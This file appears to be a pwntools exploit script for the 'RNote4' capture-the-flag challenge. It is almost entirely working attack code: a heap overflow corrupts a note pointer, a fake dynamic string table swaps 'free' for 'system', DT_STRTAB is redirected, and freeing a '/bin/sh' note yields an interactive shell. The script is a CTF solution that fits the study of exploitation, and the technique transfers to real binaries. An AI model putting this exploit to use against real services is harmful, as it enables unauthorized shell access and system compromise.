# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './RNote4'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '127.0.0.1'
    port = '10000'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    se(num)

def add(size , text = 'a'):
    cmd(p8(1))
    se( p8(size))
    se( text)

def edit(idx ,size, text):
    cmd(p8(2))
    se(p8(idx))
    se(p8(size))
    se(text)

def delete(idx ):
    cmd( p8(3) )
    se( p8(idx) )

# one_gad = one_gadget(libc.path)

# LOAD:0000000000601EA8                 Elf64_Dyn <5, 4003F8h>  ; DT_STRTAB

# LOAD:00000000004003F8 byte_4003F8     db 0                    ; DATA XREF: LOAD:00000000004002D8↑o
# LOAD:00000000004003F8                                         ; LOAD:00000000004002F0↑o ...
# LOAD:00000000004003F9 aLibcSo6        db 'libc.so.6',0        ; DATA XREF: LOAD:00000000004004A0↓o
# LOAD:0000000000400403 aExit           db 'exit',0             ; DATA XREF: LOAD:00000000004003C8↑o
# LOAD:0000000000400408 aStackChkFail   db '__stack_chk_fail',0 ; DATA XREF: LOAD:00000000004002F0↑o
# LOAD:0000000000400419 aStdin          db 'stdin',0            ; DATA XREF: LOAD:00000000004003E0↑o
# LOAD:000000000040041F aCalloc         db 'calloc',0           ; DATA XREF: LOAD:0000000000400368↑o
# LOAD:0000000000400426 aMemset         db 'memset',0           ; DATA XREF: LOAD:0000000000400308↑o
# LOAD:000000000040042D aRead           db 'read',0             ; DATA XREF: LOAD:0000000000400338↑o
# LOAD:0000000000400432 aAlarm          db 'alarm',0            ; DATA XREF: LOAD:0000000000400320↑o
# LOAD:0000000000400438 aAtoi           db 'atoi',0             ; DATA XREF: LOAD:00000000004003B0↑o
# LOAD:000000000040043D aSetvbuf        db 'setvbuf',0          ; DATA XREF: LOAD:0000000000400398↑o
# LOAD:0000000000400445 aLibcStartMain  db '__libc_start_main',0
# LOAD:0000000000400445                                         ; DATA XREF: LOAD:0000000000400350↑o
# LOAD:0000000000400457 aFree           db 'free',0             ; DATA XREF: LOAD:00000000004002D8↑o
# LOAD:000000000040045C aGmonStart      db '__gmon_start__',0   ; DATA XREF: LOAD:0000000000400380↑o
# LOAD:000000000040046B aGlibc24        db 'GLIBC_2.4',0        ; DATA XREF: LOAD:00000000004004B0↓o
# LOAD:0000000000400475 aGlibc225       db 'GLIBC_2.2.5',0

# 直接改 free 处偏移字符串为system ，在第一次调用free 时就会直接解析 system
# 为啥本地不通呢,开docker的可以通，但是

def attack():
    
    free_got = elf.got['free']
    free_got_ld = 0x0000000000400626
    DT_STRTAB = 0x0000000000601EB0
    fake_table  = '\x00'*0x5f + 'system\x00'
    fake_table = fake_table.ljust(0x73,'\x00')
    fake_table += 'GLIBC_2.4\x00'
    fake_table += 'GLIBC_2.2.5\x00'

    fake_table_addr = 0x00000000006020D0 + 0x100

    add(0x20 , 'a'*0x20)
    add(0x80 , 'a'*0x80)
    add(0x20 , '/bin/sh\x00'.ljust(0x20 , '\x00'))

    payload = 'a'*0x28 + flat(0x21 , 0x80 , fake_table_addr)
    edit(0 , len(payload) ,payload)
    edit(1 , len(fake_table) , fake_table)

    payload = 'a'*0x28 + flat(0x21 , 0x80 , DT_STRTAB)
    edit(0 , len(payload) ,payload)
    edit(1 , 0x8 , p64(fake_table_addr))
    
    # payload = 'a'*0x28 + flat(0x21 , 0x80 , free_got)
    # edit(0 , len(payload) ,payload)
    # #修改dynstr指针
    # edit(1,0x8,p64(free_got_ld))

    # dbg()
    delete(2)

    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   RNote4.py
@Time    :   2022/02/08 18:19:22
@Author  :   Niyah 
'''